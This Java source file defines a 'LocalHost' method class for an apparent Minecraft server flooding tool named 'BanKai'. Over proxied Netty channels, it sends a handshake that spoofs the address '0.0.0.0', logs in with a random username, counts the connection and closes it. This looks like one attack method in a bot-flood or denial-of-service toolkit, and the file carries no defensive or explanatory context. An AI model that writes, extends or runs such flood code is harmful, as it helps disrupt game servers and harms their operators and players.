package dev.xdmeow.core.methods.impl;

import dev.xdmeow.BanKai;
import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.helper.RandomUtils;
import dev.xdmeow.core.util.mcutil.ext.Handshake;
import dev.xdmeow.core.util.mcutil.ext.LoginRequest;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class LocalHost implements IMethod{

    private Handshake handshake;
    private byte[] bytes;

    public LocalHost(){
        handshake = new Handshake(BanKai.protocol, "0.0.0.0", BanKai.port, 2);
        bytes = handshake.getWrappedPacket();
    }

    @Override
    public void accept(Channel channel, Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(RandomUtils.randomString(12))).getWrappedPacket()));
        ++NettyBootstrap.currentConnections;
        ++NettyBootstrap.totalConnections;
        channel.close();
    }
    
}
